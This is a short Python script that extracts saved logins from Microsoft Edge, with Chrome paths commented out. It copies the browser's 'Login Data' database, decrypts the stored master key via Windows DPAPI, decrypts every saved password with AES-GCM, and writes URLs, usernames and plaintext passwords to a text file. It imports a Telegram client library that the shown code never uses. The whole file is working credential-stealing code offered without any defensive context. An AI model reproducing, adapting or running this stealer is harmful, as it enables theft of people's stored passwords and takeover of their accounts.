import base64
import shutil
from Cryptodome.Cipher import AES
import win32crypt
import os
import sqlite3 as sql
from pyrogram import Client
import json

#print(os.name)
#print(os.environ['USERPROFILE'])
#login_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
#copy_login_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login_copy'
#local_state_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State'

#"AppData\Local\Microsoft\Edge\User Data\Default"
login_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
copy_login_db_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login_copy'
local_state_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State'
password_path = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\passwords__.txt'

#copy_login_db_path = "Login DataC 61"
#local_state_path = "Local StateC 61"

if os.path.exists(login_db_path):
    shutil.copy(login_db_path, copy_login_db_path)

vt = sql.connect(copy_login_db_path)
cursor = vt.cursor()
b = cursor.execute("SELECT action_url, username_value, password_value FROM logins")
data = b.fetchall()

vt.close()

with open(local_state_path, "r", encoding='utf-8') as f:
    local_state = json.loads(f.read())

master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
master_key = master_key[5:]
master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]

aa = ""

if len(data) > 0:
    for i in data:
        url = i[0]
        username = i[1]
        epassword = i[2]

        try:
            password = win32crypt.CryptUnprotectData(epassword, None, None, None, 0)[1]
        
            if isinstance(password, bytes):
                password = str(password, "utf-8")
        except:
            iv = epassword[3:15]
            payload = epassword[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            password = cipher.decrypt(payload)
            password = password[:-16].decode()

        aa += "{} : {} : {}\n".format(
            url,
            username,
            password
        )


with open(password_path, "w", encoding="utf-8") as dosya:
    dosya.write(aa)
